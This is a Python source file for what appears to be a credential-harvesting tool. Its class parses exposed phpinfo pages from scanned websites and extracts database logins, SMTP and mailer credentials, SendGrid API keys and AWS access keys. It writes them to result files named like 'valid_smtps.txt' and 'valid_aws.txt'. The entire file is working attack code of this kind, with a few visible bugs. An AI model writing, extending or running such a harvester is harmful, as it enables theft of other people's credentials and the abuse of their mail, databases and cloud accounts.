import re
import urllib.parse


class Phpinfo:

    def php_databases(self, page, star):
        global db_username, db_password, db_connection, db_port, db_database, db_host, method
        try:
            if "MYSQL_HOST" in page or "DB_PASSWORD" in page or "DB_PASS" in page or "DB_PWD" in page or "DB_OLD_USERNAME" in page:
                if "MYSQL_HOST </td><td" in page:
                    method = "/phpinfo1"
                    try:
                        db_host = re.findall('MYSQL_HOST </td><td class="v">(.*?) </td></tr>\n', page)[0]
                        if "localhost" in db_host:
                            db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                        elif "127.0.0.1" in db_host:
                            db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                    except:
                        db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                    try:
                        db_connection = "mysql"
                    except:
                        pass
                    try:
                        db_username = re.findall('MYSQL_USER </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        db_username = ''
                    try:
                        db_password = re.findall('MYSQL_PASSWORD </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        db_password = ''
                    try:
                        db_port = re.findall('MYSQL_PORT </td><td class="v">(.*?) </td></tr>\n', page)[0]
                        if db_port == "null":
                            db_port = "3306"
                        else:
                            db_port = db_port
                    except:
                        db_port = "3306"
                    try:
                        db_database = re.findall('MYSQL_DATABASE </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        db_database = ''
                elif "DB_PASSWORD </td><td" in page:
                    method = "/phpinfo2"
                    try:
                        db_host = re.findall('DB_HOST </td><td class="v">(.*?) </td></tr>\n', page)[0]
                        if "localhost" in db_host:
                            db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                        elif "127.0.0.1" in db_host:
                            db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                    except:
                        db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                    try:
                        db_connection = "mysql"
                    except:
                        pass
                    try:
                        db_username = re.findall('DB_USERNAME </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        db_username = ''
                    try:
                        db_password = re.findall('DB_PASSWORD </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        pass
                    try:
                        db_port = re.findall('DB_PORT </td><td class="v">(.*?) </td></tr>\n', page)[0]
                        if db_port == "null":
                            db_port = "3306"
                        else:
                            db_port = db_port
                    except:
                        db_port = "3306"
                    try:
                        db_database = re.findall('DB_DATABASE </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        db_database = ''
                elif "DB_PASS </td><td" in page:
                    method = "/phpinfo3"
                    try:
                        db_host = re.findall('DB_HOST </td><td class="v">(.*?) </td></tr>\n', page)[0]
                        if "localhost" in db_host:
                            db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                        elif "127.0.0.1" in db_host:
                            db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                    except:
                        db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                    try:
                        db_connection = "mysql"
                    except:
                        pass
                    try:
                        db_username = re.findall('DB_USER </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        db_username = ''
                    try:
                        db_password = re.findall('DB_PASS </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        db_password = ''
                    try:
                        db_port = re.findall('DB_PORT </td><td class="v">(.*?) </td></tr>\n', page)[0]
                        if db_port == "null":
                            db_port = "3306"
                        else:
                            db_port = db_port
                    except:
                        db_port = "3306"
                    try:
                        db_database = re.findall('DB_DATABASE </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        db_database = ''
                elif "DATABASE_USERNAME </td><td" in page:
                    method = "/phpinfo4"
                    try:
                        db_username = re.findall('DATABASE_USERNAME </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        db_username = ''
                    try:
                        db_password = re.findall('DATABASE_PASSWORD </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        db_password = ''
                    try:
                        db_connection = re.findall('DATABASE_CONNECTION </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        db_connection = "mysql"
                    try:
                        db_port = re.findall('DATABASE_PORT </td><td class="v">(.*?) </td></tr>\n', page)[0]
                        if db_port == "null":
                            db_port = "3306"
                        else:
                            db_port = db_port
                    except:
                        db_port = "3306"
                    try:
                        db_host = re.findall('DATABASE_HOST </td><td class="v">(.*?) </td></tr>\n', page)[0]
                        if "localhost" in db_host:
                            db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                        elif "127.0.0.1" in db_host:
                            db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                    except:
                        db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                elif "DB_OLD_USERNAME </td><td" in page:
                    method = "/phpinfo5"
                    try:
                        db_username = re.findall('DB_OLD_USERNAME </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        db_username = ''
                    try:
                        db_password = re.findall('DB_OLD_PASSWORD </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        db_password = ''
                    try:
                        db_connection = re.findall('DB_OLD_CONNECTION </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        db_connection = "mysql"
                    try:
                        db_port = re.findall('DB_OLD_PORT </td><td class="v">(.*?) </td></tr>\n', page)[0]
                        if db_port == "null":
                            db_port = "3306"
                        else:
                            db_port = db_port
                    except:
                        db_port = "3306"
                    try:
                        db_host = re.findall('DB_OLD_HOST </td><td class="v">(.*?) </td></tr>\n', page)[0]
                        if "localhost" in db_host:
                            db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                        elif "127.0.0.1" in db_host:
                            db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                    except:
                        db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                elif "WP_DB_USER </td><td" in page:
                    method = "/phpinfo5"
                    try:
                        db_username = re.findall('WP_DB_USER </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        db_username = ''
                    try:
                        db_password = re.findall('WP_DB_PASS </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        db_password = ''
                    try:
                        db_connection = re.findall('WP_DB_CONNECTION </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        db_connection = "mysql"
                    try:
                        db_port = re.findall('WP_DB_PORT </td><td class="v">(.*?) </td></tr>\n', page)[0]
                        if db_port == "null":
                            db_port = "3306"
                        else:
                            db_port = db_port
                    except:
                        db_port = "3306"
                    try:
                        db_host = re.findall('WP_DB_HOST </td><td class="v">(.*?) </td></tr>\n', page)[0]
                        if "localhost" in db_host:
                            db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                        elif "127.0.0.1" in db_host:
                            db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                    except:
                        db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                if db_username == '' or db_password == '' or db_username == 'null' or db_password == 'null':
                    pass
                else:
                    build = 'URL: ' + str(star) + '\nMETHOD: ' + str(method) + '\nDB_CONNECTION: ' + str(
                        db_connection) + '\nDB_HOST: ' + str(db_host) + '\nDB_PORT: ' + str(
                        db_port) + '\nDB_DATABASE: ' + str(db_database) + '\nDB_USERNAME: ' + str(
                        db_username) + '\nDB_PASSWORD: ' + str(db_password)
                    remover = str(build).replace('\r', '')
                    save = open('Results/DATABASE.txt', 'a')
                    save.write(remover + '\n\n')
                    save.close()
                    url = star
                    return url, method, db_connection, db_host, db_port, db_database, db_username, db_password
            else:
                return False
        except:
            return False

    def php_urls(self, page, star):
        global db_username, db_password, db_port, db_host, db_connection, db_database
        method = "/php_urls_info"
        try:
            if "DATABASE_URL']</td><td" in page or "MAIL_SERVER_DB_URL']</td><td" in page:
                if "DATABASE_URL" in page:
                    database_url = re.findall("DATABASE_URL']</td><td class=(.*?)</td></tr>", page)[0].replace('"v">',
                                                                                                               "")
                    try:
                        db_connection = database_url.split("://")[0]
                    except:
                        db_connection = ''
                    try:
                        db_username = database_url.split("://")[1].split(":")[0]
                    except:
                        db_username = ''
                    try:
                        db_password = database_url.split("://")[1].split(":")[1].split("@")[0]
                    except:
                        db_password = ''
                    try:
                        db_host = database_url.split("://")[1].split(":")[1].split("@")[1].split(":")[0]
                        if "localhost" in db_host:
                            db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                        elif "127.0.0.1" in db_host:
                            db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                    except:
                        db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                    try:
                        db_port = database_url.split("://")[1].split(":")[2].split("/")[0]
                        if db_port == "null":
                            db_port = "3306"
                        else:
                            db_port = db_port
                    except:
                        if db_connection == "mysql":
                            db_port = "3306"
                        elif db_connection == "pgsql":
                            db_port = "5432"
                        elif db_connection == "mongodb":
                            db_port = "27017"
                        else:
                            db_port = "3306"
                    try:
                        db_database = database_url.split("://")[1].split(":")[2].split("/")[1].split("?")[0]
                    except:
                        db_database = db_username
                elif "MAIL_SERVER_DB_URL" in page:
                    database_url_mail = re.findall("MAIL_SERVER_DB_URL']</td><td class=(.*?)</td></tr>", page)[
                        0].replace(
                        '"v">', "")
                    try:
                        db_connection = database_url_mail.split("://")[0]
                    except:
                        db_connection = "mysql"
                    try:
                        db_username = database_url_mail.split("://")[1].split(":")[0]
                    except:
                        db_username = ''
                    try:
                        db_password = database_url_mail.split("://")[1].split(":")[1].split("@")[0]
                    except:
                        db_password = ''
                    try:
                        db_host = database_url_mail.split("://")[1].split(":")[1].split("@")[1].split(":")[0]
                        if "localhost" in db_host:
                            db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                        elif "127.0.0.1" in db_host:
                            db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                    except:
                        db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                    try:
                        db_port = database_url_mail.split("://")[1].split(":")[2].split("/")[0]
                        if db_port == "null":
                            db_port = "3306"
                        else:
                            db_port = db_port
                    except:
                        if db_connection == "mysql":
                            db_port = "3306"
                        elif db_connection == "pgsql":
                            db_port = "5432"
                        elif db_connection == "mongodb":
                            db_port = "27017"
                        else:
                            db_port = "3306"
                    try:
                        db_database = database_url_mail.split("://")[1].split(":")[2].split("/")[1].split("?")[0]
                    except:
                        db_database = db_username
                if db_username == '' or db_password == '' or db_username == 'null' or db_password == 'null':
                    return False
                else:
                    build = 'URL: ' + str(star) + '\nMETHOD: ' + str(method) + '\nDB_CONNECTION: ' + str(
                        db_connection) + '\nDB_HOST: ' + str(db_host) + '\nDB_PORT: ' + str(
                        db_port) + '\nDB_DATABASE: ' + str(db_database) + '\nDB_USERNAME: ' + str(
                        db_username) + '\nDB_PASSWORD: ' + str(db_password)
                    remover = str(build).replace('\r', '')
                    save = open('Results/DATABASE.txt', 'a')
                    save.write(urllib.parse.unquote(remover) + '\n\n')
                    save.close()
                    url = star
                    return url, method, db_connection, db_host, db_port, db_database, db_username, db_password
            else:
                pass
        except Exception as e:
            pass

    def php_mailer_urls(self, page, url):
        global smtp_username, smtp_password, smtp_host, smtp_port, zoeken, mailer_url
        v = open("Results/dnsjes.txt", "a")
        method = "/phpinfo_urls"
        smtp_from = ""
        smtp_name = ""
        try:
            if "MAILER_URL']</td><td" in page or "MAILER_DSN']</td><td" in page:
                if "MAILER_URL']</td><td" in page:
                    mailer_url = re.findall("MAILER_URL']</td><td class=(.*?)</td></tr>\n", page)[0] \
                        .replace('"v">', "")
                    if mailer_url == "" or mailer_url == "null://localhost":
                        pass
                    else:
                        method = mailer_url.split("://")[0]
                        if method == "smtp":
                            if "&amp;username=" in mailer_url and "&amp;password=" in mailer_url and "?encryption=" in \
                                    mailer_url and "&amp;auth_mode=" in mailer_url:
                                try:
                                    zoeken = re.findall("\nsmtp://(.*?):(.*?)?encryption=tls&amp;auth_mode="
                                                        "login&amp;username=(.*?)&amp;password=(.*?)\n", mailer_url)
                                except:
                                    pass
                                try:
                                    smtp_host = re.findall("(.*?):", mailer_url)[0]
                                except:
                                    smtp_host = zoeken[0]
                                try:
                                    smtp_port = re.findall(":(.*?)?encryption=", mailer_url)[0]
                                except:
                                    smtp_port = zoeken[1]
                                try:
                                    smtp_username = re.findall("username=(.*?)&", mailer_url)[0]
                                except:
                                    smtp_username = zoeken[3]
                                try:
                                    smtp_password = re.findall("password=(.*?)\n", mailer_url)[0]
                                except:
                                    smtp_password = zoeken[4]
                            elif "&amp;username=" in mailer_url and "&amp;password=" in mailer_url and "?encryption=" \
                                    in mailer_url and ";auth_mode=" in mailer_url:
                                try:
                                    zoeken = re.findall("\n(.*?):(.*?)?encryption=ssl&amp;username=(.*?)&amp;password="
                                                        "(.*?)&amp;auth_mode=\n", mailer_url)
                                except:
                                    pass
                                try:
                                    smtp_host = re.findall("(.*?):", mailer_url)[0]
                                except:
                                    smtp_host = zoeken[1]
                                try:
                                    smtp_port = re.findall(":(.*?)?encryption=", mailer_url)[0]
                                except:
                                    smtp_port = zoeken[2]
                                try:
                                    smtp_username = re.findall("&amp;username=(.*?)&", mailer_url)[0]
                                except:
                                    smtp_username = zoeken[3]
                                try:
                                    smtp_password = re.findall("&amp;password=(.*?)&amp;", mailer_url)[0]
                                except:
                                    smtp_password = zoeken[4]
                            elif "&amp;username=" in mailer_url and "&amp;password=" in mailer_url and "?encryption=" \
                                    not in mailer_url and "?auth_mode=" in mailer_url:
                                try:
                                    zoeken = re.findall('\nsmtp://(.*?):(.*?)?auth_mode=login&amp;username=(.*?)'
                                                        '&amp;password=(.*?)\n', mailer_url)
                                except:
                                    pass
                                try:
                                    smtp_host = re.findall("(.*?):", mailer_url)[0]
                                except:
                                    smtp_host = zoeken[1]
                                try:
                                    smtp_port = re.findall(":(.*?)?auth_mode=", mailer_url)[0]
                                except:
                                    smtp_port = zoeken[2]
                                try:
                                    smtp_username = re.findall("username=(.*?)&", mailer_url)[0]
                                except:
                                    smtp_username = zoeken[3]
                                try:
                                    smtp_password = re.findall("password=(.*?)\n", mailer_url)[0]
                                except:
                                    smtp_password = zoeken[4]
                            elif "&amp;username=" in mailer_url and "&amp;password=" in mailer_url and "?encryption=" in mailer_url \
                                    and "&amp;auth_mode=" in mailer_url:
                                try:
                                    smtp_host = mailer_url.split("://")[1].split(":")[0]
                                except:
                                    pass
                                try:
                                    smtp_port = mailer_url.split("://")[1].split(":")[1].split("?")[0]
                                except:
                                    pass
                                try:
                                    smtp_username = mailer_url.split("&amp;username=")[1].split("&amp;")[0]
                                except:
                                    pass
                                try:
                                    smtp_password = mailer_url.split("&amp;password=")[1].split("&amp")[0]
                                except:
                                    pass
                            elif "&amp;username=" not in mailer_url and "&amp;password=" not in mailer_url and "?encryption=" in \
                                    mailer_url and "&amp;auth_mode=" in mailer_url:
                                try:
                                    smtp_host = mailer_url.split("@")[1].split(":")[0]
                                except:
                                    pass
                                try:
                                    smtp_port = mailer_url.split("@")[1].split(":")[1].split("?encryption=")[0]
                                except:
                                    pass
                                try:
                                    smtp_username = mailer_url.split("://")[1].split("@")[0].split(":")[0]
                                except:
                                    pass
                                try:
                                    smtp_password = mailer_url.split("://")[1].split("@")[0].split(":")[1]
                                except:
                                    pass
                            else:
                                try:
                                    smtp_host = mailer_url.split("://")[1].split(":")[0]
                                except:
                                    pass
                                try:
                                    smtp_port = mailer_url.split("://")[1].split(":")[1].split("?")[0]
                                except:
                                    smtp_port = "587"
                                try:
                                    smtp_username = mailer_url.split("://")[1].split(":")[1].split("?")[1].split(";")[2]
                                except:
                                    pass
                                try:
                                    smtp_password = mailer_url.split("://")[1].split(":")[1].split("?")[1].split(";")[
                                        3].replace(
                                        "password=", "").replace("&amp", "")
                                except:
                                    pass
                        elif method == "gmail":
                            smtp_host = "smtp.gmail.com"
                            smtp_port = "587"
                            try:
                                smtp_username = mailer_url.split("://")[1].split("@default")[0].split(":")[0]
                            except:
                                try:
                                    smtp_username = mailer_url.split("://")[1].split("@localhost")[0].split(":")[0]
                                except:
                                    smtp_username = ''
                            try:
                                smtp_password = mailer_url.split("://")[1].split("@default")[0].split(":")[1]
                            except:
                                try:
                                    smtp_password = mailer_url.split("://")[1].split("@localhost")[0].split(":")[1]
                                except:
                                    smtp_password = ''
                            smtp_from = smtp_username
                            smtp_name = ''
                        elif method == "sendinblue+smtp":
                            smtp_host = "smtp-relay.sendinblue.com"
                            smtp_port = "587"
                            try:
                                smtp_username = mailer_url.split("://")[1].split("@default")[0].split(":")[0]
                            except:
                                try:
                                    smtp_username = mailer_url.split("://")[1].split("@localhost")[0].split(":")[0]
                                except:
                                    smtp_username = ''
                            try:
                                smtp_password = mailer_url.split("://")[1].split("@default")[0].split(":")[1]
                            except:
                                try:
                                    smtp_password = mailer_url.split("://")[1].split("@localhost")[0].split(":")[1]
                                except:
                                    smtp_password = ''
                            smtp_from = smtp_username
                            smtp_name = ''
                        else:
                            if mailer_url == "" or mailer_url == "null://localhost":
                                pass
                            else:
                                v.write(mailer_url + "\n")
                                v.close()
                elif "MAILER_DSN']</td><td" in page:
                    v = open("Results/dnsjes.txt", "a")
                    mailer_url = re.findall("MAILER_DSN']</td><td class=(.*?)</td></tr>\n", page)[0] \
                        .replace('"v">', "")
                    if mailer_url == "" or mailer_url == "null://localhost":
                        pass
                    else:
                        method = mailer_url.split("://")[0]
                        if method == "smtp":
                            if "&amp;username=" in mailer_url and "&amp;password=" in mailer_url and "?encryption=" in \
                                    mailer_url and "&amp;auth_mode=" in mailer_url:
                                try:
                                    zoeken = re.findall("\nsmtp://(.*?):(.*?)?encryption=tls&amp;auth_mode="
                                                        "login&amp;username=(.*?)&amp;password=(.*?)\n", mailer_url)
                                except:
                                    pass
                                try:
                                    smtp_host = re.findall("(.*?):", mailer_url)[0]
                                except:
                                    smtp_host = zoeken[0]
                                try:
                                    smtp_port = re.findall(":(.*?)?encryption=", mailer_url)[0]
                                except:
                                    smtp_port = zoeken[1]
                                try:
                                    smtp_username = re.findall("username=(.*?)&", mailer_url)[0]
                                except:
                                    smtp_username = zoeken[3]
                                try:
                                    smtp_password = re.findall("password=(.*?)\n", mailer_url)[0]
                                except:
                                    smtp_password = zoeken[4]
                            elif "&amp;username=" in mailer_url and "&amp;password=" in mailer_url and "?encryption=" \
                                    in mailer_url and ";auth_mode=" in mailer_url:
                                try:
                                    zoeken = re.findall("\n(.*?):(.*?)?encryption=ssl&amp;username=(.*?)"
                                                        "&amp;password=(.*?)&amp;auth_mode=\n", mailer_url)
                                except:
                                    pass
                                try:
                                    smtp_host = re.findall("(.*?):", mailer_url)[0]
                                except:
                                    smtp_host = zoeken[1]
                                try:
                                    smtp_port = re.findall(":(.*?)?encryption=", mailer_url)[0]
                                except:
                                    smtp_port = zoeken[2]
                                try:
                                    smtp_username = re.findall("&amp;username=(.*?)&", mailer_url)[0]
                                except:
                                    smtp_username = zoeken[3]
                                try:
                                    smtp_password = re.findall("&amp;password=(.*?)&amp;", mailer_url)[0]
                                except:
                                    smtp_password = zoeken[4]
                            elif "&amp;username=" in mailer_url and "&amp;password=" in mailer_url and "?encryption=" \
                                    not in mailer_url and "?auth_mode=" in mailer_url:
                                try:
                                    zoeken = re.findall('\nsmtp://(.*?):(.*?)?auth_mode=login&amp;username=(.*?)'
                                                        '&amp;password=(.*?)\n', mailer_url)
                                except:
                                    pass
                                try:
                                    smtp_host = re.findall("(.*?):", mailer_url)[0]
                                except:
                                    smtp_host = zoeken[1]
                                try:
                                    smtp_port = re.findall(":(.*?)?auth_mode=", mailer_url)[0]
                                except:
                                    smtp_port = zoeken[2]
                                try:
                                    smtp_username = re.findall("username=(.*?)&", mailer_url)[0]
                                except:
                                    smtp_username = zoeken[3]
                                try:
                                    smtp_password = re.findall("password=(.*?)\n", mailer_url)[0]
                                except:
                                    smtp_password = zoeken[4]
                            elif "&amp;username=" in mailer_url and "&amp;password=" in mailer_url and "?encryption=" in mailer_url \
                                    and "&amp;auth_mode=" in mailer_url:
                                try:
                                    smtp_host = mailer_url.split("://")[1].split(":")[0]
                                except:
                                    pass
                                try:
                                    smtp_port = mailer_url.split("://")[1].split(":")[1].split("?")[0]
                                except:
                                    pass
                                try:
                                    smtp_username = mailer_url.split("&amp;username=")[1].split("&amp;")[0]
                                except:
                                    pass
                                try:
                                    smtp_password = mailer_url.split("&amp;password=")[1].split("&amp")[0]
                                except:
                                    pass
                            elif "&amp;username=" not in mailer_url and "&amp;password=" not in mailer_url and "?encryption=" in \
                                    mailer_url:
                                try:
                                    smtp_host = mailer_url.split("@")[1].split(":")[0]
                                except:
                                    smtp_host = ''
                                try:
                                    smtp_port = mailer_url.split("@")[1].split(":")[1].split("?encryption=")[0]
                                except:
                                    smtp_port = '587'
                                try:
                                    smtp_username = mailer_url.split("://")[1].split("@")[0].split(":")[0]
                                except:
                                    smtp_username = ''
                                try:
                                    smtp_password = mailer_url.split("://")[1].split("@")[0].split(":")[1]
                                except:
                                    smtp_password = ''
                            else:
                                try:
                                    smtp_host = mailer_url.split("@")[2].split(":")[0]
                                except:
                                    smtp_host = ''
                                try:
                                    smtp_port = mailer_url.split(":")[3]
                                except:
                                    smtp_port = '587'
                                try:
                                    smtp_username = mailer_url.split("://")[1].split(":")[0]
                                except:
                                    smtp_username = ''
                                try:
                                    smtp_password = mailer_url.split("://")[1].split(":")[1].split("@")[0]
                                except:
                                    smtp_password = ''
                        elif method == "gmail":
                            smtp_host = "smtp.gmail.com"
                            smtp_port = "587"
                            try:
                                smtp_username = mailer_url.split("://")[1].split("@default")[0].split(":")[0]
                            except:
                                try:
                                    smtp_username = mailer_url.split("://")[1].split("@localhost")[0].split(":")[0]
                                except:
                                    smtp_username = ''
                            try:
                                smtp_password = mailer_url.split("://")[1].split("@default")[0].split(":")[1]
                            except:
                                try:
                                    smtp_password = mailer_url.split("://")[1].split("@localhost")[0].split(":")[1]
                                except:
                                    smtp_password = ''
                            smtp_from = smtp_username
                            smtp_name = ''
                        elif method == "sendinblue+smtp":
                            smtp_host = "smtp-relay.sendinblue.com"
                            smtp_port = "587"
                            try:
                                smtp_username = mailer_url.split("://")[1].split("@default")[0].split(":")[0]
                            except:
                                try:
                                    smtp_username = mailer_url.split("://")[1].split("@localhost")[0].split(":")[0]
                                except:
                                    smtp_username = ''
                            try:
                                smtp_password = mailer_url.split("://")[1].split("@default")[0].split(":")[1]
                            except:
                                try:
                                    smtp_password = mailer_url.split("://")[1].split("@localhost")[0].split(":")[1]
                                except:
                                    smtp_password = ''
                            smtp_from = smtp_username
                            smtp_name = ''
                        else:
                            if mailer_url == "" or mailer_url == "null://localhost":
                                pass
                            else:
                                v.write(mailer_url + "\n")
                                v.close()
                if smtp_username == '' or smtp_password == '' or smtp_username == 'null' or smtp_password == 'null' or smtp_username == '""' or smtp_password == '""':
                    pass
                else:
                    build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\nMAILHOST: ' + str(
                        smtp_host) + '\nMAILPORT: ' + str(smtp_port) + '\nMAILUSER: ' + str(
                        smtp_username) + '\nMAILPASS: ' + str(smtp_password) + '\nMAILFROM: ' + str(
                        smtp_from) + '\nFROMNAME: ' + str(smtp_name)
                    if "apikey" in smtp_username:
                        builder = smtp_username + '|' + smtp_password
                        remover = builder.replace('\r', '')
                        sendgridsmtp = open('Results/sendgrid_api.txt', 'a')
                        sendgridsmtp.write(urllib.parse.unquote(remover) + '\n')
                        sendgridsmtp.close()
                        remover = str(build).replace('\r', '')
                        sendgridlong = open('Results/sendgrid_api_full.txt', 'a')
                        sendgridlong.write(remover + '\n\n')
                        sendgridlong.close()
                        return smtp_host, smtp_port, smtp_username, smtp_password, smtp_from
                    else:
                        remover = build.replace('\r', '')
                        smtps = open("Results/valid_smtps.txt", "a")
                        smtps.write(urllib.parse.unquote(remover) + '\n\n')
                        smtps.close()
                        return smtp_host, smtp_port, smtp_username, smtp_password, smtp_from
            else:
                return False
        except Exception as e:
            return False

    def php_smtp(self, page, url):
        global smtp_host, smtp_username, smtp_password, smtp_port
        smtp_from = ""
        smtp_name = ""
        try:
            if "SMTP_PASSWORD </td><td" in page or "SMTP_PASS </td><td" in page or "SMTP_USERNAME </td><td" in \
                    page:
                if "SMTP_PASSWORD </td><td" in page:
                    try:
                        smtp_host = re.findall('SMTP_HOST </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        pass
                    try:
                        smtp_username = re.findall('SMTP_USER </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        pass
                    try:
                        smtp_password = re.findall('SMTP_PASSWORD </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        pass
                    try:
                        smtp_port = re.findall('SMTP_PORT </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        smtp_port = "587"
                if "SMTP_USERNAME </td><td" in page:
                    try:
                        smtp_host = re.findall('SMTP_HOST </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        pass
                    try:
                        smtp_username = re.findall('SMTP_USERNAME </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        pass
                    try:
                        smtp_password = re.findall('SMTP_PASSWORD </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        pass
                    try:
                        smtp_port = re.findall('SMTP_PORT </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        smtp_port = "587"
                if "SMTP_PASS </td><td" in page:
                    try:
                        smtp_host = re.findall('SMTP_HOST </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        pass
                    try:
                        smtp_username = re.findall('SMTP_USER </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        pass
                    try:
                        smtp_password = re.findall('SMTP_PASS </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        pass
                    try:
                        smtp_port = re.findall('SMTP_PORT </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        smtp_port = "587"
                if smtp_username == '' or smtp_password == '' or smtp_username == 'null' or smtp_password == 'null' or smtp_username == '""' or smtp_password == '""':
                    return False
                else:
                    build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\nMAILHOST: ' + str(
                        smtp_host) + '\nMAILPORT: ' + str(smtp_port) + '\nMAILUSER: ' + str(
                        smtp_username) + '\nMAILPASS: ' + str(smtp_password) + '\nMAILFROM: ' + str(
                        smtp_from) + '\nFROMNAME: ' + str(smtp_name)
                    if "apikey" in smtp_username and "sendgrid" in smtp_host:
                        builder = str(smtp_username) + '|' + str(smtp_password)
                        remover = builder.replace('\r', '')
                        sendgridsmtp = open('Results/sendgrid_api.txt', 'a')
                        sendgridsmtp.write(remover + '\n')
                        sendgridsmtp.close()
                        remover = str(build).replace('\r', '')
                        sendgridlong = open('Results/sendgrid_api_full.txt', 'a')
                        sendgridlong.write(remover + '\n\n')
                        sendgridlong.close()
                        return smtp_host, smtp_port, smtp_username, smtp_password, smtp_from
                    else:
                        remover = build.replace('\r', '')
                        smtps = open("Results/valid_smtps.txt", "a")
                        smtps.write(remover + '\n\n')
                        smtps.close()
                        return smtp_host, smtp_port, smtp_username, smtp_password, smtp_from
            else:
                return False
        except:
            return False

    def php_aws(self, page):
        global aws_region, aws_id, aws_secret
        try:
            if "AWS_ACCESS_KEY_ID" in page or "S3_KEY" in page:
                if "AWS_ACCESS_KEY_ID </td><td" in page:
                    try:
                        aws_id = re.findall('AWS_ACCESS_KEY_ID </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        aws_id = ""
                    try:
                        aws_secret = re.findall('AWS_SECRET_ACCESS_KEY </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        aws_secret = ""
                    try:
                        aws_region = re.findall('AWS_DEFAULT_REGION </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        aws_region = "us-east-2"
                elif "S3_KEY </td><td" in page:
                    try:
                        aws_id = re.findall('S3_KEY </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        aws_id = ""
                    try:
                        aws_secret = re.findall('S3_SECRET </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        aws_secret = ""
                    try:
                        aws_region = re.findall('S3_REGION </td><td class="v">(.*?) </td></tr>\n', page)[0]
                    except:
                        aws_region = "us-east-2"
                if aws_id == "" or aws_secret == "" or aws_id == "null" or aws_secret == "null":
                    return False
                else:
                    build = aws_id + "|" + aws_secret + "|" + aws_region
                    schrijven = open('Results/valid_aws.txt', "a")
                    schrijven.write(build + "\n")
                    schrijven.close()
                    return aws_id, aws_secret, aws_region
            else:
                return False
        except:
            return False
